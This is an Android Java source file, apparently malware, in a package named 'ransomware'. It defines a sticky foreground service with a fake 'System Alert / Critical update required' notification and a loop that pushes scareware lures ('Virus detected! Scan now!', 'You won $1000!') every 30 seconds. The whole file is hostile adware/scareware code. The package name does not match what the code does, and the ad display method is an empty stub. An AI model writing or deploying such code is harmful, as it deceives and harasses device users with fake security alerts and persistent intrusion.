package com.example.ransomware;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;
import java.util.Random;

public class AdService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Show persistent ad notifications
        startForeground(1, createAdNotification());
        
        // Random ad popups
        new Thread(() -> {
            while (true) {
                try {
                    // Show toast ads
                    String[] ads = {
                        "You won $1000! Click here!",
                        "Virus detected! Scan now!",
                        "Battery overheating! Fix now!",
                        "Storage full! Clean now!",
                        "Update required! Install now!"
                    };
                    
                    Random rand = new Random();
                    showAdToast(ads[rand.nextInt(ads.length)]);
                    
                    Thread.sleep(30000); // Every 30 seconds
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
        
        return START_STICKY;
    }
    
    private void showAdToast(String message) {
        // This would show intrusive ads
        // Implementation depends on ad network
    }
    
    private android.app.Notification createAdNotification() {
        // Create persistent notification
        return new android.app.Notification.Builder(this)
            .setContentTitle("System Alert")
            .setContentText("Critical update required")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setOngoing(true)
            .build();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
